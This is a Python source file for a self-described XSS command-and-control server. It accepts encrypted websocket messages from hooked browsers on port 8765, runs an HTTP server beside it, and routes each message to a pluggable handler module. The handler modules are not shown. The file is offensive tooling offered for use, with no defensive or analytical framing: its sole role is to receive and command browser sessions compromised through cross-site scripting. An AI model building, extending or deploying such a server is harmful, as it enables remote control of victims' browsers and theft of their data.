#!/usr/bin/env python

import asyncio
import sys
import json
import threading
from websockets import server, exceptions
from modules import getModules
from cryptoUtil import decrypt
import server.server as httpServer

modules, defaultModule = getModules.getModules()
host = "0.0.0.0"

introString = """

____ ____ ____ _  _ ____ ____ 
[__  |  | |     \/  [__  [__  
___] |__| |___ _/\_ ___] ___] 
                              

XSS Comand and control"""


async def exec(websocket):
    print("Conected")
    try:
        while True:
            msg_enc = await websocket.recv()
            message_from_client = json.loads(decrypt(msg_enc))
            handler = modules[defaultModule]
            if message_from_client["type"] in modules:
                handler = modules[message_from_client["type"]]
            if "msg" in message_from_client:
                await handler.handleMessage(websocket, message_from_client["msg"])
            else:
                await handler.handleMessage(websocket, {"msg":"OK"})
    except exceptions.ConnectionClosed:
        print("Closed by client")


async def main():
    # Iniciar el servidor http en un hilo separado
    thread = threading.Thread(target=httpServer.main)
    thread.daemon = True
    thread.start()
    async with server.serve(exec, host, 8765):
        await asyncio.Future()  # run forever


if __name__ == "__main__":

    if "-q" not in sys.argv:
        print(introString)
    asyncio.run(main())
